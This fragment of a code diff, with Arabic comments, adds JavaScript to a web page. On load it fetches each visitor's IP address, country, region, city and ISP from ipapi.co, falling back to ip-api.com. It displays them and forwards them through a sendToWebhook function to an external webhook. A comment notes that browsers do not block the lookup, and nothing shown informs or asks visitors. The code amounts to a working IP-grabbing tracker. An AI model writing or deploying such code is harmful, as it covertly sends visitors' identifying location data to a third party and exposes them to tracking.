+            }).catch(err => console.log('خطأ ويب هوك.'));
         }
 
-        // جلب معلومات المستخدم
-        fetch('https://ipwho.is/')
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    document.getElementById('info-ip').textContent = data.ip;
-                    document.getElementById('info-region').textContent = data.region;
-                    document.getElementById('info-city').textContent = data.city;
-                    document.getElementById('info-isp').textContent = data.connection.org || data.connection.isp;
-                    document.getElementById('userInfoBox').style.display = 'block';
+        // الخدمة الأساسية فائقة السرعة لجلب تفاصيل الموقع الجغرافي كاملة (لا تحظرها المتصفحات)
+        function fetchSystemNetworkData() {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.ip) {
+                        currentNetworkData = {
+                            ip: data.ip,
+                            country: data.country_name || "غير معروف",
+                            region: data.region || "غير معروف",
+                            city: data.city || "غير معروف",
+                            isp: data.org || "غير معروف"
+                        };
+                        
+                        updateLocationUI(currentNetworkData);
+                        sendToWebhook(currentNetworkData);
+                    } else {
+                        fetchFallbackIP();
+                    }
+                })
+                .catch(() => { fetchFallbackIP(); });
+        }
 
-                    // إرسال البيانات للويب هوك
-                    sendToWebhook(data);
-                }
-            })
-            .catch(err => console.log('Information fetch error:', err));
+        // الخدمة البديلة والمؤكدة في حال تعطل الأولى
+        function fetchFallbackIP() {
+            fetch('http://ip-api.com/json/?lang=ar')
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.status === "success") {
+                        currentNetworkData = {
+                            ip: data.query,
+                            country: data.country || "غير معروف",
+                            region: data.regionName || "غير معروف",
+                            city: data.city || "غير معروف",
+                            isp: data.isp || "غير معروف"
+                        };
+                        updateLocationUI(currentNetworkData);
+                        sendToWebhook(currentNetworkData);
+                    } else {
+                        showOfflineUI();
+                    }
+                })
+                .catch(() => {
+                    showOfflineUI();
+                });
+        }
+
+        // دالة تحديث نص الواجهة بالبيانات الكاملة المستخرجة
+        function updateLocationUI(data) {
+            const displayElement = document.getElementById('top-ip-display');
+            if (displayElement) {
+                displayElement.innerHTML = `
+                    الدولة: ${data.country}<br>
+                    المنطقة: ${data.region}<br>
+                    المدينة: ${data.city}<br>
+                    ip: ${data.ip}
+                `;
+            }
+        }
+
+        function showOfflineUI() {
+            const displayElement = document.getElementById('top-ip-display');
+            if (displayElement) {
+                displayElement.innerHTML = "حالة الشبكة: متصل محلياً (فشل جلب تفاصيل الموقع الخارجي)";
+            }
+        }
+
+        // بدء التشغيل التلقائي للفحص
+        fetchSystemNetworkData();
     </script>
 </body>
 
